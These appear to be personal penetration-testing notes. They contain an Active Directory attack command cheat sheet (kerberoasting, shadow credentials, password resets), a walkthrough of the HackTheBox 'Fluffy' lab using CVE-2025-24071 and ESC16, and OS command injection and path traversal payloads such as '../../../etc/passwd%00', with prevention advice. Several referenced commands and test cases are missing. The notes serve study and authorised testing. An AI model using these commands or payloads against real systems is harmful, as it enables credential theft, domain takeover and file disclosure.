docs.title: Information Gathering:
docs.text:
• nxc smb <dc> -u <username> -p <password>: To connect and test the credentials you have with SMB.
  • nxc smb <dc> -k -u <username> -p <password>: To connect and test the credentials you have with SMB using kerberos authentication.
  • nxc ldap <dc> -u <username> -p <password> --kerberoasting <Output Filename>: To find accounts with Service Principle Names (SPNs), request Kerberos service ticket for those SPNs, and save them to offline crack them later.
  • rusthound-ce --domain <domain name> -u <username> -p <password>: Collects active directory information.
  • bloodhound-ce-python -d <domain> -u <username> -p <password> -dc <dc> -ns <domain IP address> -c all: alternative tool for rusthound-ce used to collect active directory information.
  • enum4linux -a -u <domain\\user> -p <password> <dc>: to enumerate all the active directory.
  • nxc smb <machine hostname> --generate-krb5-file <output filename (krb5.conf): To dump kerbrose configurations, copy it to /etc directory.
  • get-aduser -filter * | select samaccountname: to get all active directory users on the box to make a password spray attack.
  • get-adcomputer -filter * -properties * | select name, IPv4Address: to get all IPs from a Windows machine.
  • get-aduser -filter * -properties * | selec samaccountname, mail: to get the sam account name and emails of the users.
  • get-aduser -filter * | select name, sid: to get domain group names and SID.
  • Get-ADObject -filter 'objectsid -eq "<SID>" -properties * -IncludeDeletedObjects': to get a deleted account information.
  • Restore-ADObject -Identity "<Object GUID>": to restore a deleted account.

docs.title: Active Directory Operations:
docs.text:
• bloodyAD -u <username> -p <password> -d <domain> --host <domain IP address> add groupMember <group name> <username>: to add a user in a group.
  • certipy-ad shadow auto -u <user@domain> -p <password> -account <service username> -dc-ip <domain IP address>: to create a shadow password for an account (tried on service accounts).
  • certipy-ad shadow auto -u <user@domain> -hashes :<hash> -account <service username> -dc-ip <domain IP address>: to create a shadow password for an account (tried on service accounts) using NTLM password.
  • impacket-addcomputer -computer-name <computer name> -computer-pass <password> -dc-host <dc.domain> <domain>/<user>:<password>: To add a computer a domain.
  • bloodyAD --host <domain> -d <domain> -u <username> -p <password> set password '<username>' '<new password>': To update a user's password that we have generic write on.
  • bloodyAD --host <domain> -d <domain> -u <username> -p <password> remove uac -f ACCOUNTDISABLE <username>: To enable the account that we have generic write on.
  • certipy-ad auth -pfx <certificate file> -dc-ip '<dc ip address>': to get the NTLM from a certificate.
  • nxc ldap -u <user> -p <password> --gmsa: to retrieve a Group Managed Service Account’s managed NTLM hash.
  • bloodyAD --host <DC IP> -u <username> -p <:NTLM Hash> set password <target user> <new password>: to change the password for another user.

docs.title: Active Directory Checklist
docs.text:
• Gather information regarding the AD.
  • Certificate Vulnerabilities Check:
    • EC16
    • ESC3

  • Look with winpeas if there any master keys and creds files found on any machine.
  • Look using whoami /all from dangerous priviledges like SeManageVolumePrivilege.

docs.title: Notes and Methodolgy (Fluffy HTB)
docs.text:
• When you see the Issuer name in certificate ports of the LDAP, run certipy to see if the certificates have some type of vulnerabilities.
  • Start with nxc smb connection Command#1 to test the connection with the credentials of the box and the active directory.
  • After you confirmed that the credentials are correct, start query the target DC, find accounts with Service Principle Names (SPNs), request kerberos service ticket for those SPNs, and save them to offline crack them later by using Command#2.
  • In the meantime, run rusthound to collect Active Directory data using Command#3.
  • Once you get the hashes for the service ticket using Command#2, start cracking the output file using hashcat with Command#4.
  • An alternative for rusthound is python-ce-bloodhound using Command#5.
  • Start digesting the output of rusthound-ce in bloodhound.
  • After finding nothing in bloodhound, enumerate the smb shares with the current user using nxc smb with Command#6.
  • Alternative for netexe is smbclient and you can enumerate the shares using Command#7.
  • Navigate through the smb shared and you will find a shared folder called "IT", connect to this folder using Command#8 and in this folder you will find a pdf, download the pdf file using get <filename>.
  • The pdf contains a list of CVEs and we will use the second critical CVE.
  • CVE-2025-24071 leaks the NTLM hash via .library-ms Exploit.
  • Run responder after you exploit the CVE and you will receive a NTLM hash for p.agila user.
  • Crack the hash using hashcat using Command#9.
  • After cracking the hash and get the account of p.agila you will find that you are member of a groupt called "service management" which have "GenericAll" on "Service Accounts".
  • So we can add ourselves in the "Service Accounts" using bloodyAD with Command#10.
  • Quick trick, you can enumerte all the active directory by using enum4linux with Command#11.
  • When we have GenericWrite on service accounts we create a shadow password for these account instead of reseting the passwords, we can create a shadow password using certipy with Command#12.
  • We have two services winrm_svc which will be used to connect on the machine and CA with we will use to see if there are vulnerability in the server.
  • Connecting with winrm_sv using evil-winrm with Command#13.
  • Check using Certipy with the privilege of the other account if there any vulnerabilities in the certificates using Command#14.
  • After we know that we have avulnerability in the certificates ESC16, we can map a user to be administrator by assigning him an admin certificates.
  • We first need to know what the current userPrincipleName is using Command#15.
  • We gonna update the UPN, which is a logon name for a user logon name in an email format, to be the same as win_rm using Command#16.
  • After making the user ca_svc upn to be similar to the administrator, we gonna need to request a certificate using Command#17.
  • You can see what the certificate that we requested looks like with Command#18.
  • After changing the UPN and got a certificate, we can chekc if the UPN changed with Command#15.
  • We can try to connect using the owned administrator certificate but it will fail using the Command#16.
  • Update the UPN again to ca_svc using Command#16, and try to connect again using Command#19.
  • Connect to the server using the administrator account and the hash that you got from Command#19 using Command#13.

docs.title: Changing User's Password
docs.text: • In a real pentest, it is not the best option to update a user password. If SPN was enabled we would made a shadow password for the account. In some cases we will update the password of the user and then look in the password history to update it to the previous one again or notify the company that we updated it to a new password and give them the credentials.

docs.title: Steps
docs.text:
1. On the Powershell on the victim machine execute Command#1 to get the Certificate Authority ticket.
  2. Sign the certificate using administrator using Command#2.
  3. Get the administrator password hash using Command#3.

Basic Inforamtion
docs.text:
• PortMapper is a service that is utilized for mapping network service ports to RPC (Remote Procedure Call) program numbers.
  • PortMapper is frequently scanned by attackers as it reveal valuable information; this information includes the type of Unix operating system running and details about the services that are available on the system.
  • PortMapper is commonly used in conjuction with NFS (Network File System), NIS (Network Information Service), and other RPC-based services to manage network services effectively.

docs.title: Web Penetration Testing Methodology
docs.text:

docs.title: What
docs.text: • Business logic vulnerabilties are flaws in the design and implementation of an application that allow an attacker to elicit unintended behavior.

docs.title: Where to log
docs.text: • Understand the logic of the web application and then try to exploit it.

docs.title: Excessive trust in client-side controls
docs.text:
• A fundamentally flawed assumption is that users will only interact with the application via the provided web interface.
  • Accepting data at face value, without performing proper integrity checks and server-side validation, can allow an attacker to do all kinds of damage with relatively minimal effort.

docs.title: Failing to handle unconventional input
docs.text:
• Many applications incorporate numeric limits into their logic.
  • When auditing an application, you should use tools such as Burp Proxy and Repeater to try submitting unconventional values.
  • In particular, try input in ranges that legitimate users are unlikely to ever enter. This includes exceptionally high or exceptionally low numeric inputs and abnormally long strings for text-based fields. You can even try unexpected data types.
  • By observing the application's response, you should try and answer the following questions:
    • Are there any limits that are imposed on the data?
    • What happens when you reach those limits?
    • Is any transformation or normalization being performed on your input?

docs.title: What
docs.text: • OS Command Injection allows an attacker to execute operating system commands on the server that is running an application, and typically fully compromise the application and its data.

docs.text: Purpose of command Linux Windows Name of current user whoami whoami Operating system uname -a ver Network configuration ifconfig ipconfig /all Network connections netstat -an netstat -an Running processes ps -ef tasklist

docs.title: Blind OS Command Injection
docs.text:
• You can use an injected command to trigger a time delay, enabling you to confirm that the command was executed based on the time that the application takes to respond, a good payload to use is & ping -c 20 127.0.0.1 &, this command can cause the application to ping its loopback network adapter for 20 seconds, like in TestCase#1.
  • You can redirect the output from the injected command into a file within the web root that you can then retrieve using the browser, such as & whoami > /var/www/static/whoami.txt &, and fetch the browser to http://example.com/whoami.txt as in TestCase#2.
  • You can use an injected command that will trigger an out-of-band network interaction with a system that you control, using OAST techniques, this payload uses the nslookup command to cause a DNS lookup for the specified domain, as in TestCase#3.
  • The out-of-band channel provides an easy way to exfiltrate the output from injected commands by just adding the command as a subdomain for the collaborator URL, such as in TestCase#4.

docs.title: Test Case 1
docs.text:

  • Test payload: email=devil%40hacker.me;ping -c 10 127.0.0.1;

docs.title: Ways of Injecting OS commands
docs.text:
• The following command separators work on both Windows and Unix-based systems: 
    &
&&
|
||
  • The following command separators work only on Unix-based systems: 
    ;
Newline(0x0a or \n)
  • On Unix-based systems, you can also use backticks or the doller character to perform inline execution of an injected command within the original command: 
    `Command`
$(command)
  • Sometimes, the input that you control appears within quotation marks in the original command, you need to terminate the quoted context (using " or ') before using suitable shell metacharacters to inject a new command.

docs.title: How to Prevent
docs.text:
• The most effective way to prevent OS command injection vulnerabilities is to never call out to OS commands from application-layer code.
  • If you have to call out to OS commands with user-supplied input, then you must perform strong input validation:
    • Validating against a whitelist of permitted values.
    • Validating that the input is a number.
    • Validating that the input contains only alphanumeric characters, no other syntax or whitespace.

docs.title: What
docs.text:
• Path traversal vulnerabilities enable an attacker to read arbitrary files on the server that is running an application.
  • The attacker can read sensitive files including:
    • Application code and data.
    • Credentials for back-end systems.
    • Sensitive operating system files.

docs.title: Basic Payloads
docs.text:
• Linux test payload: ../../../etc/passwd
  • Windows test payload: ..\..\..\windows\win.ini

docs.title: Bypassing Defenses
docs.text:
• You might be able to use an absolute path from the filesystem root such as ?filename=/etc/passwd without using any traversal sequence as in TestCase#2.
  • You might be able to use nested traversal sequences, such as ....// or ....\/, these revert to simple traversal squences when the inner sequence is stripped as in TestCase#3.
  • You can sometimes bypass the sanitization of filename parameter of a multipart/form-data by URL encoding, or even double encoding, the ../ characters as in TestCase#4.
  • You might include the required based folder followed by suitable traversal sequence, such as filename=/var/www/images/../../../../etc/passwd as in TestCase#5.
  • You might use a null byte to effectively terminate the file path before the required extension, the null byte %00 as in TestCase#6.

docs.title: Test Case 1:
docs.text:
• The web app loads an image /image?filename=45.jpg
  • Test payload: ../../../etc/passwd

docs.title: Test Case 2:
docs.text:
• The web page loads an image from /image?filename=45.jpg.
  • Test payload: filename=/etc/passwd

docs.title: Test Case 3:
docs.text:
• The web page loads an image from \image?filename=15.jpg
  • Test payload: filename=....//....//....//etc/passwd

docs.title: Test Case 4:
docs.text:
• The web page loads an image from /image?filename=15.jpg
  • We send the request to Burp intruder and used fuzzing path traversal.

docs.title: Test Case 5:
docs.text:
• The web app loads an image from filename=var/www/images/15.jpg.
  • From the parameter value format we knew that it needs the base folder to work, so our test payload was filename=var/www/images/../../../etc/passwd

docs.title: Test Case 6:
docs.text:
• The web app loads an image from filename=15.jpg
  • The payload we uset to omit the file extension using null byte: filename=../../../etc/passwd%00.jps

docs.title: How To Prevent
docs.text:
• The most effective way to prevent path traversal vulnerabilities is to avoid passing user-supplied input to filesystem APIs altogether.
  • If you can't avoid passing user-supplied input to filesystem APIs, we recommend using two layers of defense to prevent attacks:
    • Validate the user input before processing it. Ideally, compare the user input with a whitelist of permitted values. If that isn't possible, verify that the input contains only permitted content, such as alphanumeric characters only.
    • After validating the supplied input, append the input to the base directory and use a platform filesystem API to canonicalize the path. Verify that the canonicalized path starts with the expected base directory.
